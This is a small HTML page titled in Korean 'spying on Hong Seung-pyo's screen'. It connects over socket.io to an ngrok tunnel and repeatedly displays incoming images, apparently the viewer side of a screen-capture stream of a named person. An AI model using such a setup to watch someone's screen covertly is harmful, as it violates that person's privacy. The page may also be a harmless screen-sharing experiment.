<!DOCTYPE html>
<html>

<head>
  <title>홍승표 화면 훔쳐보기</title>
  <style>
    /* CSS 스타일을 사용하여 배경 이미지 설정 */
    body {
      background-image: url('hi.jpg');
      /* 이미지 파일의 경로를 지정합니다. */
      background-size: auto;
      /* 이미지를 화면에 꽉 채우도록 설정합니다. */
      background-repeat: no-repeat;
      /* 이미지 반복 없음 */
      background-attachment: fixed;
      /* 스크롤에 따라 배경 이미지가 고정됩니다. */
      background-position: center;
      opacity: 1;
    }
  </style>
</head>

<body>
  <h1>홍승표 화면 훔쳐보기</h1>

  <img id="receivedImage">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
  <script>
    const socket = io("https://7b7a-180-71-27-250.ngrok.io");
    const imageElement = document.getElementById('receivedImage');

    socket.emit('image');
    socket.on('image', (imageDataUrl) => {

      imageElement.src = imageDataUrl;
      socket.emit('image');
    });
  </script>
</body>

</html>
